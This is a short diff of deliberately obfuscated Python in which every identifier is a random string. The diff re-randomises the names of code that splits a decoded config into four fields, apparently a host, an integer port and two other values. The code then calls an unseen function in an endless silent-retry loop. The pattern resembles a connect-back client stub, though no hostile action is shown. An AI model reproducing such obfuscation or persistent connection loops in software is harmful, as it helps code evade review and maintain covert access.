+    zEVGTDiLtEvvPtplYOaKptz = BqkMifdCedSVocFJSQpFBGtxzEXwKKKUeBPrW(vRXjEQXxuHrcipojXveeQpAbUSkUfuv, YcdOOBtSPeKIyLwxZWOXQLZTSpyHggVBspkXoKWUbvMPD).rstrip('\n')
+    IqwVxLLifwysBecRjmxzroVJkheLnKNUWdo = zEVGTDiLtEvvPtplYOaKptz.split(',')
 
 
-    sRzYVhwMJgBPGTsXV = OVdLPzABCfMgosFRKICOHczcHgKRCcbCexZfKSnX[0]
-    ChQMkvgsQOIMZYdjGvFrhxnyacokbJoQq = int(OVdLPzABCfMgosFRKICOHczcHgKRCcbCexZfKSnX[1])
-    JgGiPQoiFfcLzsElTYQSazMfTDeBtiBwXRUBkfAHsisA = OVdLPzABCfMgosFRKICOHczcHgKRCcbCexZfKSnX[2]
-    xvwIpxolFfCsgHslVsOPZbRqbjYtdvOadYPnvvNlqUTnWsp = OVdLPzABCfMgosFRKICOHczcHgKRCcbCexZfKSnX[3]
+    IXqPBYVhZpuvYXzlfDgDUIv = IqwVxLLifwysBecRjmxzroVJkheLnKNUWdo[0]
+    gCXjObXaxXuRtZZJuc = int(IqwVxLLifwysBecRjmxzroVJkheLnKNUWdo[1])
+    EqOHKrtqZdidglBPxkGnqLmfUsVv = IqwVxLLifwysBecRjmxzroVJkheLnKNUWdo[2]
+    OEJHrtEkDjYRKkyYiHmUmuFGCqGdCF = IqwVxLLifwysBecRjmxzroVJkheLnKNUWdo[3]
 
     while True:
         try:
-            RbVHKjGXGudhMgWHfrInrQeiDXoOjSHaBZfglCzvIE(sRzYVhwMJgBPGTsXV, ChQMkvgsQOIMZYdjGvFrhxnyacokbJoQq, JgGiPQoiFfcLzsElTYQSazMfTDeBtiBwXRUBkfAHsisA, xvwIpxolFfCsgHslVsOPZbRqbjYtdvOadYPnvvNlqUTnWsp)
+            NUIwqrbNAZPMhvYYqGQeEdFHJeIfbougdowarjJRi(IXqPBYVhZpuvYXzlfDgDUIv, gCXjObXaxXuRtZZJuc, EqOHKrtqZdidglBPxkGnqLmfUsVv, OEJHrtEkDjYRKkyYiHmUmuFGCqGdCF)
         except Exception as e:
             time.sleep(1)
             continue
